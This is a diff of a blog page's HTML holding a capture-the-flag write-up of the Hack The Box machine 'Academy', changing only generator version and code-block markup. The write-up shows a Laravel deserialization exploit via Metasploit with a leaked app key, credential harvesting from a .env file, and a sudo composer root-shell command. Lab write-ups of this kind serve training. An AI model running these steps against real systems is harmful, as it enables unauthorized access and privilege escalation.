@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.99.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
 <meta name="supported-color-schemes" content="light dark"><title>HTB Academy&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="HTB Academy" /><body><section id="header">
@@ -10,20 +10,20 @@
 <p>Academy is a Linux box that focuses a lot on enumeration and attention to detail for both foothold and privilege escalation, for root it has a simple GTFO bin and lastly it was a &ldquo;special box&rdquo; that served as a way for HTB to announce <a href="https://academy.hackthebox.eu/"target="_blank" rel="noopener noreferrer">academy.hackthebox.eu</a>
 </p>
 <h2 id="enumeration">Enumeration</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.80 scan initiated Sat Nov  7 20:48:08 2020 as: nmap -sC -sV -oA Academy 10.129.20.80</span>
-Nmap scan report <span style="color:#66d9ef">for</span> 10.129.20.80
-Host is up <span style="color:#f92672">(</span>0.093s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-|_http-title: Did not follow redirect to http://academy.htb/
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span style="color:#75715e"># Nmap done at Sat Nov  7 20:48:30 2020 -- 1 IP address (1 host up) scanned in 22.22 seconds</span>
-</code></pre></div><p>Nmap shows  there is both a SSH server and a HTTP server running. Adding <code>academy.htb</code> to our <code>/etc/hosts</code> file, it&rsquo;s possible to access the website running on port 80.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.80 scan initiated Sat Nov  7 20:48:08 2020 as: nmap -sC -sV -oA Academy 10.129.20.80</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.20.80
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.093s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://academy.htb/
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Nov  7 20:48:30 2020 -- 1 IP address (1 host up) scanned in 22.22 seconds</span>
+</span></span></code></pre></div><p>Nmap shows  there is both a SSH server and a HTTP server running. Adding <code>academy.htb</code> to our <code>/etc/hosts</code> file, it&rsquo;s possible to access the website running on port 80.</p>
 <p><img  src="/img/academy-mainpage.png"
         alt/></p>
 <p>There are two other pages visible on the navigation bar, login and register. It is possible to create an account and use it to login. This leads to a pretty neat page hinting at some cool things to come for HTB, at the time this box was released.</p>
@@ -44,7 +44,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>This page shows error handling information. That information can be used to determine what more information about the site including the framework being used, Laravel. Laravel has a number of exploits including, a token deserialization vulnerability based in Metasploit.</p>
 <p><code>exploit/unix/http/laravel_token_unseralize_exec</code></p>
 <p>Option configuration is fairly standard though in this case the VHOST must be set to match the <code>dev-staging-01.academy.htb</code> so the exploit gets to the right place. The app key can be found on the the debug page found prior.</p>
-<pre><code>VHOST dev-staging-01.academy.htb
+<pre tabindex="0"><code>VHOST dev-staging-01.academy.htb
 
 APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
 </code></pre><p><img  src="/img/academy-metasploitopptions.png"
@@ -54,19 +54,19 @@ APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
 <p><code>www-data</code> doesn&rsquo;t seem to have much in the way of permissions but it can access web files and potentially find credneitals to allow an attacker to pivot to another user. The source code for the admin login page shows why a user can create a new user to login. It checks to make the username and password match a registered user and then check to make sure that user has a roleid of 1.</p>
 <p>Credentials are found for a local mysql database but login request are denied.</p>
 <p>Running a search with the Larvael API key found earlier,  A <code>.env</code> file  is found that contains a password that, while it doens&rsquo;t doesn&rsquo;t grant DB access but it does allow a pivot to <code>cry0l1t3</code>,using the su command.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@academy:/var/www/html/academy$ grep -rwnl . -e <span style="color:#e6db74">&#34;dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&#34;</span>
-./.env
-www-data@academy:/var/www/html/academy$ less ./.env
-
-...
-
-DB_CONNECTION<span style="color:#f92672">=</span>mysql
-DB_HOST<span style="color:#f92672">=</span>127.0.0.1
-DB_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">3306</span>
-DB_DATABASE<span style="color:#f92672">=</span>academy
-DB_USERNAME<span style="color:#f92672">=</span>dev
-DB_PASSWORD<span style="color:#f92672">=</span>mySup3rP4s5w0rd!!
-</code></pre></div><p><img  src="/img/academy-sucry0l1t3.png"
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ grep -rwnl . -e <span style="color:#e6db74">&#34;dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&#34;</span>
+</span></span><span style="display:flex;"><span>./.env
+</span></span><span style="display:flex;"><span>www-data@academy:/var/www/html/academy$ less ./.env
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DB_CONNECTION<span style="color:#f92672">=</span>mysql
+</span></span><span style="display:flex;"><span>DB_HOST<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>DB_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>DB_DATABASE<span style="color:#f92672">=</span>academy
+</span></span><span style="display:flex;"><span>DB_USERNAME<span style="color:#f92672">=</span>dev
+</span></span><span style="display:flex;"><span>DB_PASSWORD<span style="color:#f92672">=</span>mySup3rP4s5w0rd!!
+</span></span></code></pre></div><p><img  src="/img/academy-sucry0l1t3.png"
         alt/></p>
 <p>User.txt is now accessible and the shell prompt can then be improved by running <code>/bin/bash</code>.</p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
@@ -78,11 +78,12 @@ DB_PASSWORD<span style="color:#f92672">=</span>mySup3rP4s5w0rd!!
         alt/></p>
 <h2 id="root">Root</h2>
 <p>Now that <code>mrb3n</code>&rsquo;s password is known, it is trivial to us <code>su</code> to pivot to that user.  <code>sudo -l</code> returns that <code>mrb3n</code> can run <code>composer</code>, a known GTFO Bin, as root.</p>
-<p><a href="https://gtfobins.github.io/gtfobins/composer/">https://gtfobins.github.io/gtfobins/composer/</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
-echo <span style="color:#e6db74">&#39;{&#34;scripts&#34;:{&#34;x&#34;:&#34;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;}}&#39;</span> &gt;$TF/composer.json
-sudo composer --working-dir<span style="color:#f92672">=</span>$TF run-script x
-</code></pre></div><p><img  src="/img/academy-donotrunasroot.png"
+<p><a href="https://gtfobins.github.io/gtfobins/composer/"target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/composer/</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;{&#34;scripts&#34;:{&#34;x&#34;:&#34;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;}}&#39;</span> &gt;$TF/composer.json
+</span></span><span style="display:flex;"><span>sudo composer --working-dir<span style="color:#f92672">=</span>$TF run-script x
+</span></span></code></pre></div><p><img  src="/img/academy-donotrunasroot.png"
         alt/></p>
 <p>Composer does warn that it <em>should not</em> be run as root, but does nothing to stop the attempt the attempt to escalate privileges and a root prompt appears.</p>
 <h2 id="wrap-up">Wrap Up</h2>
